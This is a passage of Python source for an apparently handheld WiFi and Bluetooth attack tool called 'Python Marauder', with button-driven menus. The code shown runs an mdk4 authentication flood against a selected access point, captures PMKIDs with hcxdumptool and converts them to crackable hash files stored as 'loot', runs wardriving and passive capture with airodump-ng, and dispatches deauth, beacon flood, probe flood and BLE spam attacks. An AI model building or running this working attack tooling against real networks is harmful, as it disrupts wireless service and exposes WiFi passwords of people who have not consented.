            update_screen()

            timestamp = time.strftime("%Y%m%d-%H%M%S")
            output_prefix = os.path.join(WARDRIVE_PATH, f"wardrive_{timestamp}")
            
            try:
                cmd = ["airodump-ng", "--output-format", "pcap,csv", "-w", output_prefix, WIFI_INTERFACE]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                
                ap_count = 0
                while GPIO.input(PINS["KEY3"]) != 0:
                    if active_process.poll() is not None:
                        break
                    
                    csv_filename = f"{output_prefix}-01.csv"
                    if os.path.exists(csv_filename):
                        with open(csv_filename, 'r', newline='', errors='ignore') as f:
                            # Count lines that look like APs (have at least 6 commas)
                            ap_count = sum(1 for line in f if line.count(',') > 6) -1 # Subtract header

                    draw.rectangle((0, 30, 128, 100), fill="black")
                    display_text(f"APs Found: {max(0, ap_count)}", 5, 40, font_to_use=small_font)
                    update_screen()
                    time.sleep(5)

            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            log("Wardriving session stopped.")
            show_message(["Wardrive Complete"], "lime")
            time.sleep(2)

        def set_wifi_channel(prompt_only=False):
            clear_screen()
            display_text("Set Channel", 20, 5, font_to_use=font, fill="CYAN")
            
            try:
                current_channel_out = run_command(f"iwconfig {WIFI_INTERFACE}")
                current_channel = re.search(r'Channel:(\d+)', current_channel_out).group(1)
            except:
                current_channel = "1"

            display_text(f"Current: {current_channel}", 5, 30, font_to_use=small_font)
            
            channel = int(current_channel)
            selection = channel
            while True:
                draw.rectangle((0, 50, 128, 70), fill="black")
                display_text(f"New: {channel}", 5, 50, font_to_use=small_font)
                update_screen()

                selection, action = handle_menu_input(selection, 166) # Allow up to channel 165
                if action == "Back":
                    return None
                elif action == "Select":
                    if prompt_only:
                        return channel
                    run_command(f"iwconfig {WIFI_INTERFACE} channel {channel}")
                    log(f"WiFi channel set to {channel}")
                    show_message([f"Channel set to {channel}"], "lime")
                    time.sleep(2)
                    return
                # Custom UP/DOWN logic for channel selection
                elif GPIO.input(PINS["UP"]) == 0:
                    channel = (channel % 165) + 1
                    selection = channel
                elif GPIO.input(PINS["DOWN"]) == 0:
                    channel = (channel - 2 + 165) % 165 + 1
                    selection = channel


        def clear_logs():
            if show_confirmation("Clear all logs?"):
                log("Clearing logs.")
                os.system(f"rm -f {LOG_FILE}")
                os.system("rm -f /tmp/marauder_*")
                show_message(["Logs cleared."], "lime")
                time.sleep(2)

        def show_system_info():
            clear_screen()
            display_text("System Info", 20, 5, font_to_use=font, fill="CYAN")
            
            ip = run_command("hostname -I").strip().split()[0] if run_command("hostname -I").strip() else "N/A"
            uptime = run_command("uptime -p").strip().replace("up ", "")
            mem_free = run_command("free -h | grep Mem | awk '{print $4}'").strip()
            
            info_lines = [
                f"IP: {ip}",
                f"Uptime: {uptime}",
                f"Free Mem: {mem_free}",
            ]
            
            y = 25
            for line in info_lines:
                display_text(line, 5, y, font_to_use=small_font)
                y += 15
            
            display_text("Press any key...", 5, 110, font_to_use=small_font)
            update_screen()
            
            time.sleep(0.5)
            while all(GPIO.input(p) == 1 for p in PINS.values()):
                time.sleep(0.05)
            while any(GPIO.input(p) == 0 for p in PINS.values()):
                time.sleep(0.05)

        def reboot_system():
            if show_confirmation("Reboot device?"):
                show_message(["Rebooting..."])
                time.sleep(1)
                run_command("reboot")

        def shutdown_system():
            if show_confirmation("Shutdown device?"):
                show_message(["Shutting down..."])
                time.sleep(1)
                run_command("shutdown now")

        def run_auth_flood():
            global active_process
            log("Auth flood requires a target.")
            target_ap = scan_for_aps(as_target_selector=True)
            if not target_ap:
                log("Auth flood cancelled: no target selected.")
                return

            log(f"Starting Authentication Flood on {target_ap['bssid']}")
            clear_screen()
            display_text("Auth Flood", 25, 5, font_to_use=font, fill="RED")
            display_text(f"Target: {target_ap['essid'][:16]}", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            try:
                cmd = ["mdk4", WIFI_INTERFACE, "a", "-a", target_ap['bssid']]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                while GPIO.input(PINS["KEY3"]) != 0:
                    if active_process.poll() is not None:
                        log("mdk4 process terminated unexpectedly.")
                        break
                    time.sleep(0.1)
            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            log("Auth flood stopped.")

        def run_pmkid_capture():
            global active_process
            log("Starting PMKID capture.")
            clear_screen()
            display_text("Capturing PMKIDs", 10, 5, font_to_use=font, fill="CYAN")
            display_text("Scanning for 60s...", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            timestamp = time.strftime("%Y%m%d-%H%M%S")
            pcapng_path = os.path.join(HANDSHAKE_PATH, f"pmkid_{timestamp}.pcapng")
            hash_path = os.path.join(HANDSHAKE_PATH, f"pmkid_{timestamp}.22000")

            try:
                cmd = ["hcxdumptool", "-i", WIFI_INTERFACE, "-o", pcapng_path, "--enable_status=1"]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                
                start_time = time.time()
                while time.time() - start_time < 60:
                    if GPIO.input(PINS["KEY3"]) == 0:
                        break
                    display_text(f"Time: {int(time.time() - start_time)}s", 5, 50, font_to_use=small_font)
                    update_screen()
                    time.sleep(1)

            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            
            log("PMKID capture finished. Converting...")
            show_message(["Converting...", pcapng_path.split('/')[-1]], "yellow")
            
            if os.path.exists(pcapng_path):
                conversion_cmd = f"hcxpcaptool -z {hash_path} {pcapng_path}"
                run_command(conversion_cmd)
                if os.path.exists(hash_path) and os.path.getsize(hash_path) > 0:
                    log(f"Successfully converted to {hash_path}")
                    show_message(["Hashes saved to:", hash_path.split('/')[-1]], "lime")
                else:
                    log("Conversion failed or produced empty file.")
                    show_message(["Conversion failed."], "red")
            else:
                log("Capture file not found.")
                show_message(["Capture failed."], "red")
            
            time.sleep(3)

        def run_passive_capture():
            global active_process
            log("Starting Passive Capture.")
            
            # Get channel from user
            channel = set_wifi_channel(prompt_only=True)
            if channel is None:
                log("Passive capture cancelled.")
                return

            clear_screen()
            display_text("Passive Capture", 10, 5, font_to_use=font, fill="CYAN")
            display_text(f"Listening on Ch: {channel}", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            run_command(f"iwconfig {WIFI_INTERFACE} channel {channel}")
            
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            PASSIVE_PATH = os.path.join(LOOT_PATH, "passive")
            os.makedirs(PASSIVE_PATH, exist_ok=True)
            output_prefix = os.path.join(PASSIVE_PATH, f"passive_ch{channel}_{timestamp}")

            try:
                cmd = ["airodump-ng", "-c", str(channel), "-w", output_prefix, WIFI_INTERFACE]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                
                while GPIO.input(PINS["KEY3"]) == 0:
                    if active_process.poll() is not None:
                        break
                    time.sleep(0.1)

            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            
            log("Passive capture stopped.")
            show_message(["Capture saved."], "lime")
            time.sleep(2)

        log("Initialization complete. Starting main loop.")
        while RUNNING:
            if not WIFI_INTERFACE:
                log("WIFI_INTERFACE not set, cannot proceed.")
                break
            item = show_menu(MENU_ITEMS, "Python Marauder")
            if not item or item == "Exit": break
            log(f"Main menu selection: {item}")
            
            if item == "Scan":
                scan_item = show_menu(SCAN_MENU_ITEMS, "Scan Menu")
                if scan_item == "Scan APs":
                    scan_for_aps()
            elif item == "Attack":
                attack_item = show_menu(ATTACK_MENU_ITEMS, "Attack Menu")
                if attack_item == "Deauth Attack":
                    target_ap_object = scan_for_aps(as_target_selector=True)
                    if target_ap_object:
                        run_deauth_attack(target_ap_object)
                elif attack_item == "Beacon Flood":
                    run_beacon_flood(rick_roll=False)
                elif attack_item == "Probe Flood":
                    run_probe_flood()
                elif attack_item == "Auth Flood":
                    run_auth_flood()
                elif attack_item == "PMKID Capture":
                    run_pmkid_capture()
                elif attack_item == "Rick Roll":
                    run_beacon_flood(rick_roll=True)
            elif item == "Sniff":
                sniff_item = show_menu(SNIFF_MENU_ITEMS, "Sniff Menu")
                if sniff_item == "Capture Handshakes":
                    run_handshake_capture()
                elif sniff_item == "Sniff Probes":
                    run_probe_sniffer()
                elif sniff_item == "Passive Capture":
                    run_passive_capture()
            elif item == "Bluetooth":
                bt_item = show_menu(BT_MENU_ITEMS, "Bluetooth Menu")
                if bt_item == "Scan BLE Devices":
                    run_ble_scan()
                elif bt_item == "Detect Apple Devices":
                    run_apple_detection()
                elif bt_item == "Detect Card Skimmers":
                    run_skimmer_detection()
                elif bt_item == "BLE Spam Menu":
                    spam_item = show_menu(BLE_SPAM_MENU_ITEMS, "BLE Spam Menu")
                    if spam_item and spam_item != "Back":
                        run_ble_spam(spam_item)
            elif item == "Wardriving":
                run_wardriving()
            elif item == "Settings":
                settings_item = show_menu(SETTINGS_MENU_ITEMS, "Settings Menu")
                if settings_item == "Set WiFi Channel":
                    set_wifi_channel()
                elif settings_item == "Clear Logs":
                    clear_logs()
                elif settings_item == "System Info":
                    show_system_info()
                elif settings_item == "Reboot":
                    reboot_system()
                elif settings_item == "Shutdown":
                    shutdown_system()

